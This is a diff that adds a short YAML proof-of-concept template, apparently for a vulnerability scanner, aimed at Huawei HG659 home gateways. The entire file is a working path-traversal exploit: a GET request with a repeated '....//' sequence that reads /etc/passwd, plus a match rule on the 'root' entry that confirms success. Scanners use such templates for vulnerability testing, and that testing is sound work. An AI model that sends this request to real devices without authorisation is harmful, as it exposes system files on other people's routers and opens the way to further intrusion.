@@ -1,0 +1,21 @@
+id: poc-yaml-huawei-home-gateway-hg659-fileread
+info:
+  name: Huawei Home Gateway Hg659 Fileread
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Huawei Home
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "root:[x*]:0:0:")
+  output: []
